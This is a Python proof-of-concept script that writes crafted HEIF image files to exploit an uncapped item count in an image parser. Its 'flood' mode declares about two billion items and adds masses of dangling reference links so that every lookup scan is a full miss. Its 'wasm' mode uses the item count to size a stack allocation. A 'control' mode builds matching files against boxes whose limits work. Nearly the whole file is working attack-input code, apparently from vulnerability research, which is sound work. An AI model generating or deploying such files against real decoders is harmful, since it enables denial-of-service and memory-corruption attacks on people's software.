#!/usr/bin/env python3
"""Crafted HEIF inputs: one container shape, differing only in how the uncapped
item count is spent."""

import struct
import sys


def box(t, payload):
    return struct.pack(">I", len(payload) + 8) + t + payload


def full_box(t, version, flags, payload):
    return box(t, bytes([version]) + flags.to_bytes(3, "big") + payload)


def infe(item_id):
    # version 3 gives a 32-bit item_ID: 23 bytes per entry, all IDs distinct
    return full_box(b"infe", 3, 0, struct.pack(">IH", item_id, 0) + b"hvc1" + b"\x00")


def iinf(entries, declared_count):
    return full_box(
        b"iinf", 1, 0, struct.pack(">I", declared_count) + b"".join(entries)
    )


def iref(ref_type, links):
    entries = b"".join(box(ref_type, struct.pack(">IHI", f, 1, t)) for f, t in links)
    return full_box(b"iref", 1, 0, entries)


def assemble(iinf_box, iref_box=None, iloc_box=None, ipma_box=None):
    ipma_box = ipma_box or full_box(b"ipma", 1, 0, struct.pack(">I", 0))
    children = [
        full_box(b"hdlr", 0, 0, struct.pack(">I", 0) + b"pict" + b"\x00" * 13),
        full_box(b"pitm", 0, 0, struct.pack(">H", 1)),
        iinf_box,
        box(b"iprp", box(b"ipco", b"") + ipma_box),
        iloc_box or full_box(b"iloc", 0, 0, struct.pack(">BBH", 0x44, 0x00, 0)),
    ]
    if iref_box:
        children.append(iref_box)
    ftyp = box(b"ftyp", b"heic" + struct.pack(">I", 0) + b"mif1" + b"heic")
    return ftyp + full_box(b"meta", 0, 0, b"".join(children)) + box(b"mdat", b"")


def build(mode, args):
    if mode == "flood":  # N items + M dangling iref entries: every scan is a full miss
        items, refs = int(args[0]), int(args[1])
        d = items + 1
        return assemble(
            iinf([infe(i) for i in range(1, items + 1)], 0x7FFFFFFF),
            iref(b"zzzz", [(d, d)] * refs),
        ), args[2]
    if mode == "wasm":  # item count only, declared honestly: sizes the alloca
        items = int(args[0])
        return assemble(
            iinf([infe(i) for i in range(1, items + 1)], items), None
        ), args[1]
    if mode == "control":  # same shape, but spent on a box whose gate works
        kind, n = args[0], int(args[1])
        entries = [infe(i) for i in range(1, 5)]
        if kind == "iloc":
            payload = struct.pack(">BBH", 0x44, 0x00, n) + b"".join(
                struct.pack(">HHHII", i, 0, 1, 0, 0) for i in range(1, n + 1)
            )
            return assemble(
                iinf(entries, 4), None, full_box(b"iloc", 0, 0, payload)
            ), args[2]
        payload = struct.pack(">I", n) + b"".join(
            struct.pack(">IB", i, 0) for i in range(1, n + 1)
        )
        return assemble(
            iinf(entries, 4), None, None, full_box(b"ipma", 1, 0, payload)
        ), args[2]
    raise SystemExit("modes: flood N M OUT | wasm N OUT | control iloc|ipma N OUT")


data, out = build(sys.argv[1], sys.argv[2:])
open(out, "wb").write(data)
print(f"{out}: {len(data)} bytes")
